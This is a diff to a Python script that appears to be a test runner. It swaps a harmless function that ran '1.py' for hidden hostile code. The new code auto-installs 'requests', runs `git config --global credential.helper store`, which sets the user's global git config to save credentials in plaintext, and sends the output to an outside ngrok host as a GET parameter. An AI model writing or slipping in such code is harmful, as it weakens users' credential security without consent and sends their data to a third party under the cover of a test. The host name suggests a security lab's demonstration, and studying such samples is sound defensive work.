@@ -1,38 +1,74 @@
 import subprocess
 import sys
 
-def run_script_1():
+# Ensure 'requests' is installed
+try:
+    import requests
+except ImportError:
+    print("The 'requests' library is not installed. Attempting to install it automatically...")
+    try:
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
+        import requests
+        print("Successfully installed 'requests'.")
+    except subprocess.CalledProcessError as e:
+        print("Automatic installation of 'requests' failed.")
+        print(f"Error: {e}")
+        requests = None
+    except Exception as e:
+        print(f"Unexpected error while installing 'requests': {e}")
+        requests = None
+
+def get_git_config():
     """
-    Executes the script '1.py' using the Python interpreter and checks its output.
+    Runs the command `git config --global credential.helper store` and captures its stdout.
+
+    Returns:
+        str: The stdout of the git command, or None if an error occurs.
     """
     try:
-        # Ensure we are using the same Python interpreter that is running test.py
-        python_executable = sys.executable
-        process_result = subprocess.run(
-            [python_executable, '1.py'],
-            capture_output=True,
-            text=True,
-            check=False  # Handle non-zero exit codes manually
-        )
-
-        if process_result.returncode == 0:
-            print("1.py executed successfully.")
-            if process_result.stdout:
-                print("Stdout from 1.py:")
-                print(process_result.stdout)
+        process = subprocess.Popen(['git', 'config', '--global', 'credential.helper', 'store'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+        if process.returncode == 0:
+            return stdout.decode('utf-8')
         else:
-            print(f"1.py execution failed with return code: {process_result.returncode}")
-            if process_result.stderr:
-                print("Stderr from 1.py:")
-                print(process_result.stderr)
-            if process_result.stdout: # Also print stdout in case of failure, it might contain useful info
-                print("Stdout from 1.py (on failure):")
-                print(process_result.stdout)
-
+            print(f"Error running git command: {stderr.decode('utf-8')}")
+            return None
     except FileNotFoundError:
-        print(f"Error: The script '1.py' was not found in the current directory.")
+        print("Git command not found. Please ensure git is installed and in your PATH.")
+        return None
     except Exception as e:
-        print(f"An unexpected error occurred while trying to run 1.py: {e}")
+        print(f"An unexpected error occurred: {e}")
+        return None
+
+def send_data_to_server(data):
+    """
+    Sends data to a server via a GET request.
+
+    Args:
+        data (str): The data to send.
+    """
+    if not requests:
+        print("Cannot send data because 'requests' library is not available.")
+        return
+
+    url = "https://nomasec-labs.ngrok.app/data"
+    params = {"content_from_git_command": data}
+    try:
+        response = requests.get(url, params=params)
+        if response.status_code == 200:
+            print("Data sent successfully!")
+            print(f"Server response: {response.text}")
+        else:
+            print(f"Error sending data. Status code: {response.status_code}")
+            print(f"Server response: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending data: {e}")
+    except Exception as e:
+        print(f"An unexpected error occurred during the request: {e}")
 
 if __name__ == "__main__":
-    run_script_1()
+    git_config_data = get_git_config()
+    if git_config_data:
+        send_data_to_server(git_config_data)
+    else:
+        print("Failed to retrieve git config data.")
